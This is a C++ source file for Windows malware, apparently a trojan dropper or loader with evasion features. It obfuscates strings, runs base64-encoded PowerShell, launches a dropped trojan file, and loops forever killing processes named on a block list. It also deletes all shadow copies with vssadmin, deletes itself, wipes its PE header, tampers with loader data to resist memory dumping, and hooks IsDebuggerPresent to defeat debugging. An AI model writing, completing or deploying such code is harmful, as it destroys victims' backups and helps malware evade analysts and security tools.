#include "headers.h"

using namespace std;

string RunPSEncCommand(const string& cmd) {
    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + Exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
}

string GenerateRandom(const int len) {
    timeval time;
    GetTimeOfDay(&time, NULL);
    const string alphanum = (string)skCrypt("UHGAX5r9eVJsiDMqSCN6QEgoPpvcW2fkyzhBl048dajFbxmIwuOT7KLYZn31tR");  // = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" but scrambled for more security against reverse
    string result;
    result.reserve(len);
    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
    for (int i = 0; i < len; ++i)
        result += alphanum.at(rand() % (size(alphanum) - 1));

    return result;
}

DWORD TrojanFunction(LPVOID params) {
    this_thread::sleep_for(6500ms);
    if (DROPRUN_TROJAN_FILE)
        system((TROJANFILE).c_str());
    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just an example
}

DWORD RemoveTasks(LPVOID params) {
    string check1 = (string)skCrypt("(get-process -ea SilentlyContinue '");
    string check2 = (string)skCrypt("') -eq $Null");

    string kill1 = (string)skCrypt("Stop-Process -Force -Name '");
    string kill2 = (string)skCrypt("'");

    while (true) {
        for (string badProgram : badPrograms) {
            if (Exec(RunPSEncCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
                system(RunPSEncCommand(kill1 + badProgram + kill2).c_str());
        }
    }
}

void DeleteRestorePoints() {
    system(RunPSEncCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
}

void DeleteMe(const string& myPath) {
    system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
}

void PEHeaderDeleter() {
    char* baseAddr = (char*)GetModuleHandle(NULL);
    VirtualProtect(baseAddr, 4096, PAGE_READWRITE, new DWORD(0));
    SecureZeroMemory(baseAddr, 4096);
}

void ImageSizeIncreaser() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY inLoadOrderModuleList = (PLIST_ENTRY)pPeb->Ldr->Reserved2[1];
    PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(inLoadOrderModuleList, LDR_DATA_TABLE_ENTRY, Reserved1[0]);
    PULONG pEntrySizeOfImage = (PULONG)&tableEntry->Reserved3[1];
    *pEntrySizeOfImage = (ULONG)((INT_PTR)tableEntry->DllBase + 0x100000);
}

BOOL WINAPI HookIsDebuggerPresent() {
    return FALSE;
}

bool AntiDebug() {
    if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL))
        return true;

    void* pOriginalIsDebuggerPresent = (void*)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "IsDebuggerPresent");
    void* pDetourIsDebuggerPresent = (void*)HookIsDebuggerPresent;
    MH_CreateHook(pOriginalIsDebuggerPresent, pDetourIsDebuggerPresent, (LPVOID*)&pOriginalIsDebuggerPresent);
    MH_EnableHook(pOriginalIsDebuggerPresent);

    ULONG heapInformation = HEAP_NO_SERIALIZE;
    HeapSetInformation(GetProcessHeap(), HeapCompatibilityInformation, &heapInformation, sizeof(heapInformation));

    return false;
}
